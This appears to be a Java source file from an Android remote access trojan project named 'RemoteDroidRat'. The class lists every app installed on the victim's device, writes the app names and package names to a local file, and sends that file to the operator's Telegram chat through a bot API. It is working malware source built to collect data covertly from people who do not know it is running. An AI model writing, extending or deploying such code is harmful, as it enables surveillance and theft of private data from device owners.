package com.KaranKumar.RemoteDroidRat.commandActions;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.provider.ContactsContract;
import android.util.Log;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.List;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.adminInfo;
import android.content.pm.PackageInfo;

public class getInstalledApp {
    private Context context;
    private TelegramBotApi telegramBot;
    private adminInfo admin;

    public getInstalledApp(Context context) {
        if (context != null) {
            this.context = context;
            this.telegramBot = new TelegramBotApi(context);
            this.admin = new adminInfo(context);
            // Handle other initialization tasks if needed.
        } else {
            // Handle the case where context is null, log an error, or throw an exception.
            Log.e("getInstalledApp", "Context is null");
        }
    }

    public void fetchAndSaveInstalledApps() {
        try {
            // Fetch installed apps
            List<PackageInfo> installedApps = context.getPackageManager().getInstalledPackages(0);

            for (PackageInfo packageInfo : installedApps) {
                String appName = packageInfo.applicationInfo.loadLabel(context.getPackageManager()).toString();
                String packageName = packageInfo.packageName;

                // Save to text file
                saveAppInfoToFile(appName, packageName);
            }

            // Send to Telegram Bot
            sendToTelegramBot(admin.getChatId(), context.getFilesDir() + File.separator + "apps.txt");
        } catch (Exception e) {
            Log.e("getInstalledApp", "Error fetching and saving apps: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void saveAppInfoToFile(String appName, String packageName) {
        try {
            FileWriter fileWriter = new FileWriter(context.getFilesDir() + File.separator + "apps.txt", true);
            fileWriter.append("App Name: " + appName + ", Package Name: " + packageName + "\n");
            fileWriter.close();
        } catch (IOException e) {
            Log.e("getInstalledApp", "Error saving app info to file: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void sendToTelegramBot(String chatId, String file) {
        try {
            if (isNetworkConnected()) {
                telegramBot.sendFile(chatId, file);
            } else {
                Log.e("getInstalledApp", "Network not connected");
            }
        } catch (Exception e) {
            Log.e("getInstalledApp", "Error sending file to Telegram Bot: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private boolean isNetworkConnected() {
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
        } catch (Exception e) {
            Log.e("getInstalledApp", "Error checking network connectivity: " + e.getMessage());
            e.printStackTrace();
            return false;
        }
    }
}
